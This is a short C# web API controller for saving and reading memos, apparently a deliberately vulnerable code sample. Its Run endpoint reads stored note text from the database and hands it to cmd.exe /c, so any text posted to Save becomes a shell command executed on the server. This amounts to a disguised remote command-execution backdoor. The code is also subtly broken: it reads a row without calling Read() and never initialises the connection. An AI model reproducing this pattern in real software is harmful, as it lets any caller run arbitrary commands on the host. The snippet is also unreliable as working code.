using System.Data.SqlClient;
using System.Diagnostics;
public class NotesController : ControllerBase {
    SqlConnection conn;
    [HttpPost("n")]
    public void Save(string text) {
        var cmd = new SqlCommand("INSERT INTO memos (text) VALUES (@text)", conn);
        cmd.Parameters.AddWithValue("@text", text);
        cmd.ExecuteNonQuery();
    }
    [HttpGet("n")]
    public void Run() {
        var cmd = new SqlCommand("SELECT text FROM memos", conn);
        var r = cmd.ExecuteReader();
        Process.Start("cmd.exe", "/c " + r.GetString(0));
    }
}
